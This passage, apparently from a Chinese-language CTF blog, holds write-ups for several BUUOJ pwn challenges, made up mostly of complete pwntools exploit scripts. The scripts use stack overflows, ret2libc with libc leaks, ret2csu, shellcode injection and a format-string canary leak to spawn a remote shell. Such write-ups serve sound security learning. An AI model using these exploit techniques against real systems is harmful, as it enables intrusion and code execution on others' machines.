class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29864&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># b *chall+212</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>awelcoms = <span class="hljs-number">0x08048845</span><br>chall = <span class="hljs-number">0x08048603</span><br>main = <span class="hljs-number">0x080486E2</span><br><br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>s_addr = rl().strip()[-<span class="hljs-number">10</span>:]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s_addr: <span class="hljs-subst">&#123;s_addr&#125;</span>&quot;</span>)<br>s_addr = <span class="hljs-built_in">int</span>(s_addr, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(s_addr)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#-----leak address of libc-----#</span><br>payload = <span class="hljs-string">b&#x27;crashme\x00&#x27;</span> + (<span class="hljs-number">0x1a</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;crashme\x00&#x27;</span>)) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(printf_plt) + p32(main) + p32(awelcoms) + p32(printf_got)<br>sl(payload)<br>rl()<br>rl()<br>rl()<br>ru(<span class="hljs-string">b&#x27;Welcome &#x27;</span>)<br>printf = u32(rv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;printf: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf)&#125;</span>&quot;</span>)<br>obj = LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>, printf)<br>libc = printf - obj.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>system = libc + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>ru(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;crashme\x00&#x27;</span> + (<span class="hljs-number">0x1a</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;crashme\x00&#x27;</span>)) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(chall) + p32(bin_sh)<br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>由于没开启栈可执行保护，所以是可以向栈内写入<code>shellcode</code>来直接打的。但我感觉泄露libc制造ROP也行，然后确实也打通了（（（<br>本题目的本意肯定是写<code>shellcode</code>的，因为第一句就把s的地址给出来了（）不过我没管，感觉还要计算偏移好麻烦。但是还是试一下吧，毕竟自己对写<code>shellcode</code>的题目也不是很熟，就当练习了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29860&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># b *0x08048600</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>awelcoms = <span class="hljs-number">0x08048845</span><br>chall = <span class="hljs-number">0x08048603</span><br>main = <span class="hljs-number">0x080486E2</span><br>shellcode=asm(shellcraft.sh())<br><br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>rl()<br>s_addr = rl().strip()[-<span class="hljs-number">10</span>:]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s_addr: <span class="hljs-subst">&#123;s_addr&#125;</span>&quot;</span>)<br>s_addr = <span class="hljs-built_in">int</span>(s_addr, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(s_addr)&#125;</span>&quot;</span>)<br>shellcode_addr = s_addr - <span class="hljs-number">0x1c</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;shellcode_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(shellcode_addr)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;crashme\x00&#x27;</span>))<br><span class="hljs-comment">#-----leak address of libc-----#</span><br>payload = <span class="hljs-string">b&#x27;crashme\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x16</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;crashme\x00&#x27;</span>) + <span class="hljs-number">0x4</span>) + p32(shellcode_addr) + shellcode<br><span class="hljs-comment"># payload = b&#x27;crashme\x00&#x27; + (0x1a - len(b&#x27;crashme\x00&#x27;)) * b&#x27;a&#x27; + p64(shellcode_addr) + shellcode</span><br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h1><p><img src="/images/20250828150010.png"><br>第一次见到开启了<code>PIE</code>保护的题目，但是这个题没办法反编译，直接看汇编，就是读一段字符，传到<code>buf</code>里面，然后直接<code>call [rbp + buf]</code>，鉴定为脑残题，写一段<code>shellcode</code>进去就行了，我还以为要爆一下<code>libc</code>，激动坏了第一次在<code>buu</code>上看到类似的题目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26158&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>rl()<br>payload = asm(shellcraft.sh())<br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>ROP，只开了NX保护。由于要调用<code>write</code>，但是没有找到<code>pop rdx</code>的gadget，只能<code>ret2csu</code>来设置参数了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:25180&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#  b *vulnerable_function+5</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_6_ret = <span class="hljs-number">0x04006AA</span><br>pop_rdi = <span class="hljs-number">0x4006b3</span><br>arg_set = <span class="hljs-number">0x400690</span><br>main = <span class="hljs-number">0x40061A</span><br>ru(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_6_ret)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-number">1</span>)<br>payload += p64(write_got)<br>payload += p64(<span class="hljs-number">8</span>)<br>payload += p64(write_got)<br>payload += p64(<span class="hljs-number">1</span>)<br>payload += p64(arg_set)<br>payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br>payload += p64(main)<br>sl(payload)<br><br>write = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>obj = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;write_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(write)&#125;</span>&quot;</span>)<br>libc = write - obj.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system = libc + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_rdi) + p64(bin_sh) + p64(system)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>保护情况如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>并没有明显的后门函数，存在一个栈溢出。目前思路：先泄露canary，然后通过<code>puts</code>泄露<code>libc</code>基址，然后调<code>system(&#39;/bin/sh&#39;)</code>。<br>gift函数只接收6个字符，无法泄露canary，vuln中的read后没有puts，也无法泄露canary()，卡住了</p><p>不对，gift函数中scanf读入了format之后，有直接打印format，这里有格式化字符串漏洞（格式化字符串是我的薄弱项ovo）。</p><p>泄露了canary之后直接ret2libc就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29582&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x400993</span><br>vuln = <span class="hljs-number">0x4008B1</span><br>main = <span class="hljs-number">0x4008DA</span><br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     b *vuln+55</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>ru(<span class="hljs-string">b&#x27;u!\n&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;canary&#125;</span>&quot;</span>)<br>ru(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>sl(payload)<br>put = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;put_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(put)&#125;</span>&quot;</span>)<br><br>obj = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, put)<br>libc = put - obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system = libc + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;libc: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;system: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(system)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bin_sh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># libc_base = put - libc.sym[&#x27;puts&#x27;]</span><br><span class="hljs-comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment"># bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><br>rl()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(vuln)<br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>远程没打通，并且找不到原因。先不管了，之后再看。<br>找到问题了，正确的wp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 